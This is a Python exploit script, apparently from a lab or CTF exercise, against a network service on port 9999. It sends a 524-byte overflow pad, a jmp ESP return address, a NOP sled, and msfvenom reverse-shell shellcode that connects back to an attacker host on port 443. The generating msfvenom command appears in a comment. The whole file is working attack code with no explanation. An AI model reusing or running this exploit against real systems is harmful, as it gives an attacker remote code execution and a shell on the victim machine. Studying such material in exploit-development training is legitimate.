#!/usr/bin/python3

import os
import sys
import socket
import signal
from struct import pack

host = "192.168.0.28"
port = 9999

offset = 524
before_eip = b"A" * offset
eip = pack("<I", 0x311712F3) # jmp ESP
#msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.27 LPORT=443 -f c -b "\x00" EXITFUNC=thread

shellcode = (b"\xbf\x43\xad\x59\x0c\xda\xd4\xd9\x74\x24\xf4\x5b\x33\xc9"
b"\xb1\x12\x31\x7b\x12\x83\xc3\x04\x03\x38\xa3\xbb\xf9\x8f"
b"\x60\xcc\xe1\xbc\xd5\x60\x8c\x40\x53\x67\xe0\x22\xae\xe8"
b"\x92\xf3\x80\xd6\x59\x83\xa8\x51\x9b\xeb\xea\x0a\x5b\xf0"
b"\x82\x48\x5c\x07\xe8\xc4\xbd\xb7\x68\x87\x6c\xe4\xc7\x24"
b"\x06\xeb\xe5\xab\x4a\x83\x9b\x84\x19\x3b\x0c\xf4\xf2\xd9"
b"\xa5\x83\xee\x4f\x65\x1d\x11\xdf\x82\xd0\x52")

payload = before_eip + eip + b"\x90"*20 + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print(s.recv(1024).decode())
print("[+] Send Exploit...")
s.send(payload)
print(s.recv(1024).decode())
s.close()